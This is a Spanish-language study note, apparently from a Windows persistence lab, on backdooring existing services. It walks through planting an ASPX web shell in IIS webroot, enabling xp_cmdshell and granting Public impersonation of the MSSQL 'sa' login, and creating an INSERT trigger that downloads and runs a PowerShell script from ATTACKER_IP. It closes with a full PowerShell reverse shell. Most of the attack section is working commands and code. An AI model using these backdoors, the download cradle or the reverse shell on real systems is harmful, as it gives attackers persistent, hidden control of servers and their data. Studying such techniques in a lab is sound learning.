---
layout: apunte
title: "8. Persisting Through Existing Services"
---

Si no quieres usar las funcionalidades de Windows para esconder una backdoor, siempre puedes aprovechar la existencia de algún servicio que pueda ser usado para ejecutar código para ti. Esta tarea se centrará en cómo plantar backdoors en un setup de servidor web típico, aunque cualquier otro servicio del que tengas cierto nivel de control valdría igual.

----------------------------------
<h2>Usar Web Shells</h2>
La forma usual de conseguir persistencia en un servidor web es subiendo una web shell al directorio web. Esto es trivial y garantiza acceso con los privilegios del usuario definido en IIS, el cual es `iis apppool\defaultapppool` por defecto. Incluso si este es un usuario no privilegiado, tiene el permiso especial `SeImpersontePrivilege`, el cual nos da una forma fácil de escalar a Administrator usando varios exploits conocidos.

Vamos a comenzar descargando una web shell ASP.NET. [Aquí](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx) tienes usa, pero usa la que quieras. Transfiérela a la máquina de la víctiam y muévela a webroot, lo que por defecto está ubicado en el directorio `C:\inetpub\wwwroot`:

```batch
C:\> move shell.aspx C:\inetpub\wwwroot\
```

>[!CAUTION] Dependiendo de la forma en la que transfieras `shell.aspx`, los permisos del archivo pueden no permitir que el servidor web acceda a él. Si estás obteniendo error de denegación de permiso al acceder a la URL de la shell, dale permisos completos a todo el mundo en el archivo. Puedes hacerlo con `icalcs shell.aspx /grant Everyone:F`.

Podemos ejecutar comandos desde el servidor web apuntando a la siguiente URL:

`http://IP_MÁQUINA/shell.aspx`

!**Pasted image 20260705163203.png**

>[!IMPORTANT] Aunque es una manera sencilla de dejar una puerta trasera, el blue team suele comprobar la integridad de los archivos en el directorio web, por lo que puede ser fácilmente detectado.

----------------------------------------
<h2>Usando MSSQL como Backdoor</h2>
Hay varias maneras de plantar backdoors en instalaciones servidor de MSSQL. Por ahora, miraremos a uno de ellos que abusa disparadores. Para ponerlo de manera simple, los disparadores en MSSQL permiten que ligues acciones a ciertos eventos en la base de datos. Esos eventos pueden variar desde inicio de sesión de un usuario hasta que la información sea insertada, actualizada o borrada de una tabla dada. Para esta tarea, crearemos el disparador para cualquier INSERT en la base de datos `HRDB`.

Antes de crear el disparador, debemos reconfigurar unas cuantas cosas de la base de datos. Primero, necesitamos permitir el procedimiento almacenado de `xp_cmdshell`. Este es un procedimiento almacenado que es ofrecido por defecto en cualquier instalación de MSSQL y permite ejecutar comandos directamente en la consola del sistema pero viene deshabilitada por defecto.

Para habilitarla, vamos a abrir `Microsoft SQL Server Management Studio 18`, disponible en el menú de inicio. Cuando nos pregunte por autentificación, usaremos Windows Authentication (el valor por defecto) y estaremos loggeados con las credenciales del usuario de Windows actual. Por defecto, la cuenta de administrador local tendrá acceso a todas las bases de datos.

Una vez iniciada la sesión, hacemos click en **New Query** para abrir el editor de queries:

!**Pasted image 20260705170053.png**

Ejecutamos las siguientes sentencias SQL para permitir las opciones avanzadas en la configuración de MSSQL y procedemos a habilitar `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Después de esto, debemos asegurarnos de que cualquier web que accede a la base de datos puede ejecutar `xp_cmdshell`. Por defecto, sólo los usuarios de las bases de datos con el rol `sysadmin` serán capaces de hacerlo. Como se espera que las aplicaciones web usen un usuario restringido de base de datos, podemos otorgar privilegios a todos los usuarios para suplantar al usuario `sa`, el cual es el administrador de base de datos por defecto:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Después de todo esto, configuramos el disparador. Empezamos cambiando a la base de datos `HRDB`:

```sql
USE HRDB
```

Nuestro disparador usará `xp_cmdshell` para ejecutar PowerShell y descargar y ejecutar un archivo `.ps1` desde un servidor web controlado por el atacante. El disparador será configurado para ejecutarse cuando sea que un `INSERT` se haga a la tabla `Employees`:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Ahora que la backdoor está preparada, vamos a crear el archivo `evilscript.ps1` en nuestra máquina de atacante, el cual contendrá una reverse shell en PowerShell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

